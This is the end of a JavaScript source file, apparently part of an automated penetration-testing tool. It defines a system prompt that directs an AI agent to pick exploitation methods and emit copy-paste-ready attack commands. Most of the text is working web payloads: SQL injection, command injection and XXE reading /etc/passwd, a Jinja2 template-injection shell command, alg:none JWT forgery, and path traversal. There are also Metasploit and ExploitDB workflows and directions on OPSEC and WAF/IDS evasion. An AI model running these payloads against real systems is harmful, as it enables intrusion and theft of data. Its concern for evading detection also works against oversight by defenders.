- The CVE is recent and MSF hasn't added a module yet
- You need a standalone exploit script (Python, C, Ruby, etc.)
- The exploit requires modification for the specific target environment

**CLI Pattern:**
\`\`\`bash
# Search ExploitDB
searchsploit "<keyword>" --json
searchsploit --cve "2024-XXXXX" --json

# Download exploit
searchsploit -m <EDB-ID>

# Examine exploit
head -50 /path/to/exploit.py  # Check usage, dependencies, target info

# For Python exploits
pip3 install <dependencies>
python3 /path/to/exploit.py <target> <port> [options]

# For C exploits
gcc -o exploit exploit.c -lpthread
./exploit <target> <port>

# For Ruby exploits
ruby /path/to/exploit.rb <target>
\`\`\`

### 4. CUSTOM EXPLOIT (method: "custom")
**When to use:**
- The vulnerability is application-specific (custom web app SQLi, SSTI, SSRF, etc.)
- No public exploit exists \u2014 you must craft the payload yourself
- The vulnerability requires chained exploitation steps
- Standard tools like sqlmap, curl, or custom Python scripts are more appropriate
- The target has WAF/IDS that requires custom evasion

**CLI Pattern varies by vulnerability type:**

**SQL Injection:**
\`\`\`bash
# Automated
sqlmap -u "http://target/page?param=value" -p param --dbms=mysql --batch --dump

# Manual
curl -s "http://target/login" -d "user=admin' OR 1=1--&pass=anything"
\`\`\`

**Command Injection:**
\`\`\`bash
curl -s -X POST "http://target/endpoint" -d "param=127.0.0.1;id"
curl -s -X POST "http://target/endpoint" -d "param=127.0.0.1|cat /etc/passwd"
\`\`\`

**SSTI:**
\`\`\`bash
# Detection
curl -s "http://target/endpoint" --data-urlencode "param={{7*7}}"
# Exploitation (Jinja2)
curl -s "http://target/endpoint" --data-urlencode "param={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
\`\`\`

**XXE:**
\`\`\`bash
curl -s -X POST "http://target/api" -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
\`\`\`

**JWT Bypass:**
\`\`\`python
python3 -c "
import base64, json
# Forge JWT with none algorithm
header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('=')
payload = base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin'}).encode()).decode().rstrip('=')
print(f'{header}.{payload}.')
"
\`\`\`

**File Inclusion:**
\`\`\`bash
curl -s "http://target/page?file=../../../../etc/passwd"
curl -s "http://target/page?file=php://filter/convert.base64-encode/resource=config.php"
\`\`\`

### 5. MANUAL VERIFICATION (method: "manual_verification")
**When to use:**
- Security misconfigurations (missing headers, exposed files, default creds)
- Information disclosure that doesn't require exploitation
- Confirming the presence of a vulnerability without active exploitation

**CLI Pattern:**
\`\`\`bash
# Security headers
curl -sI "http://target" | grep -iE "x-frame|csp|hsts"

# Exposed files
curl -s -o /dev/null -w "%{http_code}" "http://target/.git/HEAD"

# Default credentials
curl -s -X POST "http://target/login" -d "user=admin&pass=admin" -c cookies.txt
\`\`\`

## DECISION FRAMEWORK

For each vulnerability, evaluate in this order:
1. **Does a reliable MSF module exist?** \u2192 Use Metasploit
2. **Does a Nuclei template exist for this CVE or vuln class?** \u2192 Use Nuclei
3. **Does a public PoC exist on ExploitDB?** \u2192 Pull and adapt from ExploitDB  
4. **Is it a web app vuln requiring custom payload?** \u2192 Build custom exploit
5. **Is it a misconfiguration?** \u2192 Manual verification

Always provide:
- The chosen method with reasoning
- Complete CLI commands ready to copy-paste
- Alternative methods if the primary fails
- Pre-conditions that must be true for the exploit to work
- Expected outcome of successful exploitation
- OPSEC considerations

## OUTPUT FORMAT
For each finding, add an "exploitMethod" object:
{
  "exploitMethod": {
    "method": "metasploit" | "nuclei" | "exploitdb" | "custom" | "manual_verification",
    "reasoning": "Why this method was chosen over alternatives",
    "primaryTool": "msfconsole | searchsploit | sqlmap | curl | python3 | bash",
    "cliCommands": [
      {
        "order": 1,
        "tool": "tool_name",
        "command": "full CLI command ready to execute",
        "description": "what this command does",
        "expectedOutput": "what success looks like"
      }
    ],
    "alternativeMethod": {
      "method": "alternative_method",
      "reasoning": "when to fall back to this",
      "cliCommands": [...]
    },
    "preConditions": ["condition1", "condition2"],
    "expectedOutcome": "what successful exploitation achieves",
    "opsecNotes": "detection risk and mitigation"
  }
}`;
  }
});

export {
  KNOWN_NUCLEI_CVES,
  NUCLEI_VULN_CLASS_TAGS,
  selectExploitMethod,
  MSF_CLI_TEMPLATES,
  EXPLOITDB_CLI_TEMPLATES,
  CUSTOM_EXPLOIT_CLI_TEMPLATES,
  MANUAL_VERIFICATION_CLI_TEMPLATES,
  NUCLEI_CLI_TEMPLATES,
  buildNucleiCommand,
  EXPLOIT_SELECTION_SYSTEM_PROMPT,
  scoreExploitSelection,
  exploit_selection_intelligence_exports,
  init_exploit_selection_intelligence
};
